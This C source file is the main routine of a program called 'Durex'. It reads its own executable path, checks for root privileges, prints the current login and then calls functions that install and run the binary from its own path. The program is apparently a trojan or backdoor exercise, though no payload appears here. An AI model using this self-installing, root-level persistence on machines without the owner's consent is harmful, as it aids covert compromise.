#include "durex.h"

#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char *current_login(void)
{
    const char      *login;
    struct passwd   *pwd;

    login = getlogin();
    if (login)
        return (login);
    pwd = getpwuid(getuid());
    if (pwd)
        return (pwd->pw_name);
    return ("unknown");
}

static int require_root(const t_durex_config *cfg)
{
    if (cfg->allow_non_root)
        return (0);
    if (geteuid() != 0)
    {
        fprintf(stderr, "Durex: root privileges required.\n");
        return (-1);
    }
    return (0);
}

int main(int argc, char **argv)
{
    t_durex_config  cfg;
    char            self_path[512];
    ssize_t         len;

    (void)argc;
    len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len < 0)
    {
        perror("readlink");
        return (EXIT_FAILURE);
    }
    self_path[len] = '\0';

    if (durex_load_config(&cfg, self_path) == -1)
        return (EXIT_FAILURE);
    if (require_root(&cfg) == -1)
        return (EXIT_FAILURE);

    printf("%s\n", current_login());
    fflush(stdout);

    durex_install(&cfg, self_path);
    if (durex_run(&cfg, &argv[1]) == -1)
        return (EXIT_FAILURE);
    return (EXIT_SUCCESS);
}
